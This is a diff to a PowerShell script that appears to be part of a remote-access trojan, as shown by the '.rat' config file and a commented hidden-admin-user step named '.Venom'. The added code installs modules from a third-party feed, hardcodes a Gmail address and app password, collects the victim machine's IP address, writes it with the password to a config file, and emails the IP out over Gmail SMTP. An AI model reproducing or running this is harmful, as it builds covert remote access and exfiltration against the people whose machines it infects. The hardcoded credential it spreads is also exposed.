@@ -26,7 +26,69 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
+# Import PowerShellGet module
+Import-Module PowerShellGet
 
+# Register the PSRepository for MimeKit and MailKit
+Register-PSRepository -Name "mimekit" -SourceLocation "https://www.myget.org/F/mimekit/api/v2"
+
+# Install MimeKit module
+Install-Module -Name "MimeKit" -RequiredVersion "4.10.0.1526" -Repository "mimekit" -Force
+
+# Install MailKit module
+Install-Module -Name "MailKit" -RequiredVersion "4.10.0.1326" -Repository "mimekit" -Force
+
+# Import the MimeKit and MailKit modules
+Import-Module MimeKit
+Import-Module MailKit
+
+# Load email and password from text files
+$email = "theedukkespallace@gmail.com"
+$pword = "jagx xeqh kigp eqor"
+
+# Retrieve the correct network interface alias
+$interfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias
+
+# Retrieve the IP address for the active network interface
+$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interfaceAlias).IPAddress
+
+# Ensure other variables are correctly defined
+$path = "$env:temp/$env:UserName.rat"
+$configfile = "$env:UserProfile\$env:UserName.rat"
+
+# Overwrite or create a new configuration file
+Set-Content -Path $configfile -Value ""
+
+# Add the content to the configuration file
+Add-Content -Path $configfile -Value $IP
+
+# Convert SecureString to plain text (understand security risks)
+$password = ConvertTo-SecureString $pword -AsPlainText -Force
+$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))
+Add-Content -Path $configfile -Value $plainPassword
+
+Add-Content -Path $configfile -Value $path
+
+# Create and send the email using MailKit
+$message = New-Object MimeKit.MimeMessage
+$message.From.Add((New-Object MimeKit.MailboxAddress "John", $email))
+$message.To.Add((New-Object MimeKit.MailboxAddress "John", $email))
+$message.Subject = "IP Address Notification from $env:UserName"
+
+# Create the body of the email
+$body = New-Object MimeKit.TextPart "plain"
+$body.Text = "Hello John,`n`nYour current IP address is: $IP`n`nBest regards,`nYour Script"
+$message.Body = $body
+
+# Configure and send the email
+$smtp = New-Object MailKit.Net.Smtp.SmtpClient
+$smtp.Connect("smtp.gmail.com", 587, "StartTls")
+$smtp.Authenticate($email, $plainPassword)
+$smtp.Send($message)
+$smtp.Disconnect($true)
+$smtp.Dispose()
+
+Write-Output "Email sent successfully!"
 
 # create admin user
 #$NewLocalAdmin = ".Venom"
